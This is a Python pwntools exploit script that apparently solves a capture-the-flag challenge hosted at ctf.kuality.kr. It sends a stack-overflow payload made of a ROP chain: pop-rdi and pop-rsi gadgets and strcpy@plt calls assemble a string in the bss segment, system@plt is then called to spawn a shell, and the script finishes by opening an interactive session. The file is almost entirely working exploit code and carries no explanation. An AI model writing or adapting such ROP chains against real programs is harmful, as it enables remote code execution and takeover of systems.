from pwn import *

#r = process("./pwn2",env={'LD_PRELOAD':'./libc.so.6'})
r = remote('ctf.kuality.kr',12351)
#gdb.attach(r,"b* 0x0000000000400acd")
payload = ''
payload += 'A'*0x10 		# padding
payload += 'B'*0x8  		# rbp
payload += p64(0x400b83) 	# pop rdi; ret;   
payload += p64(0x602000)	# bss 0x602000
payload += p64(0x400b81) 	# 0x400b81 : pop rsi ; pop r15 ; ret
payload += p64(0x400c49) 	# 0x400c49
payload += 'A'*8 			# padding
payload += p64(0x400690)	# 0x400690 strcpy@plt
payload += p64(0x400b83) 	# pop rdi; ret;   
payload += p64(0x602002)	# bss 0x602002
payload += p64(0x400b81) 	# 0x400b81 : pop rsi ; pop r15 ; ret
payload += p64(0x602100) 	# 0x602100    null;
payload += 'A'*8 			# padding
payload += p64(0x400690)	# 0x400690 strcpy@plt
payload += p64(0x400b83) 	# pop rdi
payload += p64(0x602000)	# bss 0x602000
payload += p64(0x4006b0) 	# system@plt
payload += 'A'*(112) 		# padding

payload += 'A'*0x100 		# padding
payload += p64(0xdeadbeef)  # check

r.sendlineafter("Input data : ",payload)

r.interactive()